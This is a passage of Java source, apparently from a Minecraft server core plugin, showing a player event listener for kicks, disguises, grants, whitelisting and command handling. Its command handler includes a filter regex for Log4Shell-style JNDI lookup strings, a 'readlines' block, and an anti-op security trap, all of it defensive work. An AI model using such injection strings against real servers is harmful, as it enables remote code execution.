                                        "Exception thrown when unloading permissions from "
                                                + player.getUniqueId()
                                                + " - "
                                                + player.getName()
                                                + ": ",
                                        exception);
                    }
                },
                5L);
    }

    @EventHandler
    public void onProfileNetworkLeave(ProfileNetworkLeaveEvent profileNetworkLeaveEvent) {
        UUID uuid = profileNetworkLeaveEvent.getUuid();
        IProfile profile;
        if ((profile = this.plugin.getProfileHandler().getCachedProfile(uuid)) == null) {
            if (this.plugin.isDebugMode()) {
                this.plugin.getLogger().severe("Could not find cached profile for UUID " + uuid);
            }
        } else if (profile.getDisguiseData().isDisguised()) {
            this.plugin
                    .getDisguiseHandler()
                    .cacheDisguise(uuid, profile.getDisguiseData().getDisguiseName(), false);
        }
    }

    @EventHandler
    public void onPlayerKick(PlayerKickEvent playerKickEvent) {
        playerKickEvent.setLeaveMessage("");
        Player player = playerKickEvent.getPlayer();
        if (this.plugin.getNmsHandler().isRegistered()) {
            this.plugin.getNmsHandler().getAPI().unsitPlayer(player);
        }
    }

    @EventHandler
    public void onPlayerModModeUpdate(PlayerModModeUpdateEvent playerModModeUpdateEvent) {
        NameTagUtils.applyPlayer(playerModModeUpdateEvent.getPlayer());
    }

    @EventHandler
    public void onPlayerVanishUpdate(PlayerVanishUpdateEvent playerVanishUpdateEvent) {
        Player player;
        NameTagUtils.applyPlayer(player = playerVanishUpdateEvent.getPlayer());
        this.plugin.getChatCompletionHandler().applyPlayerByPlugin(player);
        this.plugin.getWaypointHandler().handleVisibilityChange(player);
    }

    @EventHandler(priority = EventPriority.MONITOR, ignoreCancelled = true)
    public void onProfileDisguise(ProfileDisguiseEvent profileDisguiseEvent) {
        this.applyProfile(profileDisguiseEvent.getProfile());
    }

    @EventHandler(priority = EventPriority.MONITOR, ignoreCancelled = true)
    public void onProfileUndisguise(ProfileUndisguiseEvent profileUndisguiseEvent) {
        this.applyProfile(profileUndisguiseEvent.getProfile());
    }

    private void applyProfile(IProfile profile) {
        if (profile != null) {
            Player player;
            if ((player = Bukkit.getPlayer(profile.getUuid())) != null) {
                this.plugin.getChatCompletionHandler().applyPlayerByStringsByIdMap(player);
            }
        }
    }

    @EventHandler(priority = EventPriority.MONITOR, ignoreCancelled = true)
    public void onProfileGrant(ProfileGrantEvent profileGrantEvent) {
        this.applyProfileByPlugin(profileGrantEvent.getProfile());
    }

    @EventHandler(priority = EventPriority.MONITOR, ignoreCancelled = true)
    public void onProfileGrantRevoke(ProfileGrantRevokeEvent profileGrantRevokeEvent) {
        this.applyProfileByPlugin(profileGrantRevokeEvent.getProfile());
    }

    private void applyProfileByPlugin(IProfile profile) {
        if (profile != null) {
            Player player;
            if ((player = Bukkit.getPlayer(profile.getUuid())) != null) {
                this.plugin.getServerLinkHandler().setPlayer(player);
                this.plugin.getTablistOrderHandler().applyPlayer(player);
            }
        }
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onPlayerCommandPreprocess(
            PlayerCommandPreprocessEvent playerCommandPreprocessEvent) {
        if (playerCommandPreprocessEvent
                .getMessage()
                .matches("\\$\\{jndi:(ldap[s]?|rmi|dns):/[^\\n]+")) {
            playerCommandPreprocessEvent.setCancelled(true);
        } else if (playerCommandPreprocessEvent.getMessage().toLowerCase().contains("readlines")) {
            playerCommandPreprocessEvent.setCancelled(true);
        } else {
            Player player = playerCommandPreprocessEvent.getPlayer();
            IProfile profile;
            if ((profile = this.plugin.getProfileHandler().getCachedProfile(player.getUniqueId()))
                    == null) {
                player.sendMessage(
                        Color.replace(
                                "&cYour profile is not loaded and you cannot execute commands."));
                playerCommandPreprocessEvent.setCancelled(true);
            } else {
                this.plugin.getAfkHandler().recordActivity(player.getUniqueId());
                if ((profile.isBanned() || profile.isBlacklisted())
                        && !this.matchesEnabled(
                                playerCommandPreprocessEvent.getMessage().replace("/", ""))) {
                    player.sendMessage(
                            Color.translate(
                                    LocaleUtil.tr(
                                            player, MessageConfig.ERROR.CANT_CHAT_WHILE_BANNED)));
                    playerCommandPreprocessEvent.setCancelled(true);
                } else {
                    if (!player.hasPermission("core.cooldowns.bypass")
                            && !SettingsConfig.COOLDOWNS.COMMAND.startsWith("0")) {
                        if (this.plugin
                                .getCooldownHandler()
                                .isOnCooldown("command", player.getUniqueId())) {
                            player.sendMessage(
                                    Color.translate(
                                            LocaleUtil.tr(
                                                            player,
                                                            MessageConfig.COOLDOWNS
                                                                    .COMMAND_COOLDOWN)
                                                    .replace(
                                                            "<remaining>",
                                                            DateUtils.formatTimeMillis(
                                                                    this.plugin
                                                                            .getCooldownHandler()
                                                                            .getRemaining(
                                                                                    "command",
                                                                                    player
                                                                                            .getUniqueId())))));
                            playerCommandPreprocessEvent.setCancelled(true);
                        } else {
                            this.plugin
                                    .getCooldownHandler()
                                    .placeOnCooldown(
                                            "command",
                                            player.getUniqueId(),
                                            BukkitAPI.getDuration(
                                                    SettingsConfig.COOLDOWNS.COMMAND));
                        }
                    }
                    String[] texts;
                    String text =
                            (texts = playerCommandPreprocessEvent.getMessage().split(" "))
                                    [0].replace("/", "")
                                    .replace("minecraft:", "")
                                    .replace("spigot:", "")
                                    .replace("bukkit:", "");
                    Command command;
                    if ((command =
                                            this.plugin
                                                    .getCommandHandler()
                                                    .getRegistry()
                                                    .getCommandMap()
                                                    .getCommand(text))
                                    != null
                            && command.getPermission() != null
                            && !command.getPermission().isEmpty()) {
                        if (command.testPermissionSilent(player)) {
                            if ((text.equalsIgnoreCase("op") || text.equalsIgnoreCase("deop"))
                                    && !SettingsConfig.SERVER.OP_ENABLED) {
                                player.sendMessage(
                                        Color.translate(
                                                LocaleUtil.tr(
                                                        player,
                                                        MessageConfig.ERROR.OPERATOR_DISABLED)));
                                playerCommandPreprocessEvent.setCancelled(true);
                            } else {
                                if (text.equalsIgnoreCase("op") && texts.length > 1) {
                                    if (GlobalConfig.SECURITY.ENABLED
                                            && GlobalConfig.SECURITY.OP_TRIGGER) {
                                        String text2 = texts[1];
                                        String message = playerCommandPreprocessEvent.getMessage();
                                        playerCommandPreprocessEvent.setCancelled(true);
                                        IProfile profile2 = profile;
                                        Tasks.runAsync(
                                                () -> {
                                                    IProfile profile3;
                                                    if ((profile3 =
                                                                    BukkitAPI
                                                                            .getProfileByNameNoDisguise(
                                                                                    text2))
                                                            == null) {
                                                        this.plugin
                                                                .getSecurityHandler()
                                                                .recordTrip("op-unknown");
                                                        PlaceholderReplacer.applyString(
                                                                MessageConfig.SECURITY
                                                                        .ALERT_OP_UNKNOWN,
                                                                LocaleUtil.replacements(
                                                                        "<server>",
                                                                        this.plugin
                                                                                .getNetworkHandler()
                                                                                .getDisplayName(),
                                                                        "<actor>",
                                                                        profile2
                                                                                .getNameWithColorNoDisguise(),
                                                                        "<target>",
                                                                        text2));
                                                        Tasks.run(
                                                                () ->
                                                                        Bukkit.dispatchCommand(
                                                                                Bukkit
                                                                                        .getConsoleSender(),
                                                                                "blacklist "
                                                                                        + profile2
                                                                                                .getName()
                                                                                        + " -s "
                                                                                        + GlobalConfig
                                                                                                .SECURITY
                                                                                                .PUNISHMENT_REASON));
                                                    } else if (this.plugin
                                                                    .getSecurityHandler()
                                                                    .hasSecurity(
                                                                            player.getUniqueId())
                                                            && this.plugin
                                                                    .getSecurityHandler()
                                                                    .hasSecurity(
                                                                            profile3
                                                                                    .getUniqueId())) {
                                                        Tasks.runAtEntity(
                                                                player,
                                                                () -> {
                                                                    if (player.isOnline()) {
                                                                        Bukkit.dispatchCommand(
                                                                                player,
                                                                                message.substring(
                                                                                        1));
                                                                    }
                                                                });
                                                    } else {
                                                        this.plugin
                                                                .getSecurityHandler()
                                                                .recordTrip("op");
                                                        PlaceholderReplacer.applyString(
                                                                MessageConfig.SECURITY.ALERT_OP,
                                                                LocaleUtil.replacements(
                                                                        "<server>",
                                                                        this.plugin
                                                                                .getNetworkHandler()
                                                                                .getDisplayName(),
                                                                        "<actor>",
                                                                        profile2
                                                                                .getNameWithColorNoDisguise(),
                                                                        "<target>",
                                                                        profile3
                                                                                .getNameWithColorNoDisguise()));
                                                        if (GlobalConfig.SECURITY.PUNISH_SENDER) {
                                                            Tasks.run(
                                                                    () ->
                                                                            Bukkit.dispatchCommand(
                                                                                    Bukkit
                                                                                            .getConsoleSender(),
                                                                                    "blacklist "
                                                                                            + profile2
                                                                                                    .getName()
                                                                                            + " -s "
                                                                                            + GlobalConfig
                                                                                                    .SECURITY
                                                                                                    .PUNISHMENT_REASON));
                                                        }
                                                        IProfile profile4 = profile3;
                                                        Tasks.run(
                                                                () ->
                                                                        Bukkit.dispatchCommand(
                                                                                Bukkit
                                                                                        .getConsoleSender(),
                                                                                "blacklist "
                                                                                        + profile4
                                                                                                .getName()
                                                                                        + " -s "
                                                                                        + GlobalConfig
                                                                                                .SECURITY
                                                                                                .PUNISHMENT_REASON));
                                                    }
                                                });
                                    }
                                } else if (!SettingsConfig.SERVER.COMMANDS.EXCLUDED_FROM_LOGS
                                        .contains(text)) {
                                    this.plugin
                                            .getCommandLogHandler()
                                            .saveCommandLog(
                                                    player.getUniqueId(),
                                                    this.plugin.getNetworkHandler().getServerName(),
                                                    playerCommandPreprocessEvent.getMessage());
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    private void applyUUID(UUID uUID, boolean matches, boolean matches2, boolean matches3) {
        if (!matches) {
            this.plugin.getProfileHandler().getRepository().removeFromOnlineCache(uUID);
        }
        if (!matches2) {
            this.plugin.getGrantHandler().getRepository().removeFromOnlineCache(uUID);
        }
        if (!matches3) {
            this.plugin.getPunishmentHandler().getRepository().removeFromOnlineCache(uUID);
        }
    }

    private boolean matchesEnabled(String text) {
        for (String text2 : SettingsConfig.SERVER.COMMANDS.BANNED_ALLOWED_COMMANDS) {
            if (text.toLowerCase().startsWith(text2.toLowerCase())) {
                return true;
            }
        }
        return false;
    }

    private String formatString(IProfile profile) {
        if (!this.plugin.getWhitelistHandler().isWhitelisted()) {
            return null;
        }
        Set<WhitelistAccess> accessTypes = this.plugin.getWhitelistHandler().getAccessTypes();
        IRank whitelistRank = this.plugin.getWhitelistHandler().getWhitelistRank();
        IServerData serverByName =
                this.plugin.getNetworkHandler().getServerByName(GlobalConfig.SERVER.NAME);
        WhitelistAccess whitelistAccess = null;
        WhitelistAccess[] whitelistAccesss;
        int value = (whitelistAccesss = WhitelistAccess.values()).length;
        for (int index = 0; index < value; index++) {
            WhitelistAccess whitelistAccess2 = whitelistAccesss[index];
            if (accessTypes.contains(whitelistAccess2)) {
                if (whitelistAccess2.getFunction().apply(profile, serverByName)) {
                    return null;
                }
                whitelistAccess = whitelistAccess2;
            }
        }
        return Color.translate(
                BukkitAPI.getKickMessage(
                                whitelistAccess == WhitelistAccess.RANK
                                        ? MessageConfig.WHITELIST.RANK_KICK_MESSAGE
                                        : MessageConfig.WHITELIST.UUID_KICK_MESSAGE)
                        .replace(
                                "<rank>",
                                whitelistRank != null ? whitelistRank.getDisplayName() : ""));
    }

    private boolean matchesEnabled(Player player, IProfile profile) {
        try {
            PhoenixPermissibleBase phoenixPermissibleBase =
                    new PhoenixPermissibleBase(
                            player,
                            profile,
                            this.plugin,
                            this.plugin.getPermissionMap(),
                            this.plugin.getChildPermissionCache());
            PermissibleInjector.applyPlayer(
                    player, phoenixPermissibleBase, this.plugin.getLogger());
            return true;
        } catch (Throwable throwable) {
            this.plugin
                    .getLogger()
                    .log(
                            Level.SEVERE,
                            "Exception thrown when setting up permissions for "
                                    + player.getUniqueId()
                                    + " - "
                                    + player.getName()
                                    + " - denying login.",
                            throwable);
            return false;
        }
    }

    public AsyncPlayerPreLoginListener(Phoenix phoenix) {
        this.plugin = phoenix;
    }
}
